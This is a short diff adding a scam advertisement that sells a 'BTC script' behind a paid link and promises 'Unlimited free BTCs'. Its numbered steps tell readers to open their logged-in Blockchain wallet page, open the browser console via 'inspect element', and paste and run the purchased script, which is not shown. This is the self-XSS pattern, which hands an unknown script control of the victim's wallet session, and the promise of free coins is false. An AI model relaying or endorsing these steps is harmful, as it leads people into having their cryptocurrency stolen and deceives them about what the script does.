@@ -1,0 +1,24 @@
+Download BTC SCRIPT TX unconfirmed Blockchain Transaction: "https://satoshidisk.com/pay/C7HTd6"
+
+STEPS TO LAUNCH THE SCRIPT + TIPS
+
+1)Clear browsing data(Recommended Google chrome)
+
+2)Open your Blockchain account on 
+
+3)On your Blockchain page right click with the mouse and choose "inspect element”;
+
+4)Go to "Console" tab and paste the script;
+
+5)Press enter to start script;
+
+6)Done all Procedures recommended by the script
+
+8)Get your Unlimited free BTCs
+
+HOW TO USE: "https://youtu.be/Fpx8M09iP8U"
+
+NOTE:
+
+BTC SCRIPT TX unconfirmed Blockchain  GET VERIFIED ONLY 310000 SATOSHI
+
